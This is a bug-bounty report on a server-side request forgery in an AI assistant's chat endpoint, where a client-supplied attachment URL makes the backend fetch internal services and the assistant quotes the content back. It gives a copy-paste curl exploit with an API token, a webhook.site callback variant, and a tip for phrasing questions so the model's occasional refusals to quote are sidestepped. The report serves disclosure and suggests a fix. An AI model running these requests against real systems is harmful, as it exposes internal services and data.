# BUG-014 — Full-read SSRF via assistant `context.fileAttachments[].url` (internal service readback demonstrated)

**Target:** `https://bugbounty1.qe.optrostaging.ai` (AuditBoard / Optro QE — bugbounty1 instance)
**Reporter:** zeno0 (Bugcrowd)
**Date:** 2026-11-08
**Severity requested:** P3 (VRT: Internal Data/Service Exposure with content readback). P2-arguable if triage weights arbitrary internal HTTP body readback as Secrets-adjacent.
**Status:** Validated end-to-end, minimal probing, all requests attributed.

## Summary

The AuditBoard Assistant chat accepts a client-controlled `context.fileAttachments[]` array.
Each item carries a client-supplied **`url`**. The ML backend fetches that URL server-side
(`aiohttp/3.14.5`, egress `34.214.1.78`), ingests the response body, and the assistant then
returns the fetched **content in the chat**. No validation binds `url` to a real uploaded
file record: any authenticated org user can make the server fetch **arbitrary external AND
internal URLs** and read the response bodies — a full-read (non-blind) SSRF.

Unlike BUG-012 (automation_credentials host → Jira-shape-gated readback), this sink has
**no response-shape gate**: any text-parseable body (md/html/json) comes back verbatim.

## Impact

- **Internal service content readback (demonstrated):** `GET http://integrations.qa.soxhubapp.com/version`
  (internal-only service) → assistant quoted `"v1.16.1"` verbatim.
- Arbitrary external fetch + verbatim content readback (out-of-band confirmed:
  webhook.site hit from `34.214.1.78`, UA `Python/3.12 aiohttp/3.14.5`).
- Fetch source is the ML service's network position (VPC-internal). Reachable set includes
  the main Rails app on loopback (`localhost:3000`), the integrations service, and any
  internal HTTP service. IMDSv2 tokenless GET returned no content (IMDS holds);
  `file://` scheme returned no content.
- Attacker requirement: valid org account (tester role). Zero victim interaction.

## Reproduction (copy-paste)

```bash
TOKEN="230:030e33d86f0e868ef008a057f4cd584d65dde0c5"   # any org API token
BASE="https://bugbounty1.qe.optrostaging.ai"
CID="conversation::user:230"

curl -sS -N -m 200 "${BASE}/api/v1/assistant/chat/stream" -X POST \
  -H "token: ${TOKEN}" -H "Content-Type: application/json" \
  -H "X-Conversation-Id: ${CID}" -H "Accept: application/x-ndjson" \
  -d '{
    "userMessage": "Read the attached markdown file. What exact version string appears in it? Quote it.",
    "conversationId": "'"${CID}"'",
    "mode": "ask",
    "context": {
      "module": {"name": "knowledge", "route": "/knowledge"},
      "attachments": [],
      "fileAttachments": [{
        "id": "9002",
        "file_key": "zx/int-uniq-9183.md",
        "filename": "notes.md",
        "url": "http://integrations.qa.soxhubapp.com/version",
        "size": 100
      }]
    }
  }'
```

Streamed assistant answer (observed):

> According to the attached file search, the exact version string is `"v1.16.1"`.

External-readback variant (swap `url` for `https://webhook.site/<uuid>/t063c`): webhook.site
logs `GET /assist-ssrf-t063c` from `34.214.1.78` UA `Python/3.12 aiohttp/3.14.5`, and the
assistant quotes the served content verbatim (observed marker `ASSIST-SSRF-READBACK-MARKER-6363`).

## Constraints observed (honest)

- `filename` extension must be in {xlsx, pdf, docx, md, html, pptx} — validation precedes fetch.
- `file_key` dedupes ingestion (cache): use a unique `file_key` per probe.
- IMDS (169.254.169.254) — IMDSv2 enforced, tokenless GET yields nothing readable.
- `file://` scheme — no content returned.
- Verbatim quoting is sometimes model-refused; targeted questions (single value) extract reliably.

## Suggested fix

Reject `context.fileAttachments[].url` values that are not vendor-S3 presigned URLs bound to
the authenticated user's file records; fetch only via the record's own storage key with the
caller's tenant-scoped role. Enforce egress denylist for RFC1918/link-local/instance-metadata.

## Artifacts

- scripts/t062_assist_fileread.py, t063* probes; state/t062..t063f_results.json
- Raw streams: state/assistant_t062*.ndjson … assistant_t063f_*.ndjson
- webhook.site channel c0dce999-3955-4b42-80f0-6f70562df28b (hit log retained)
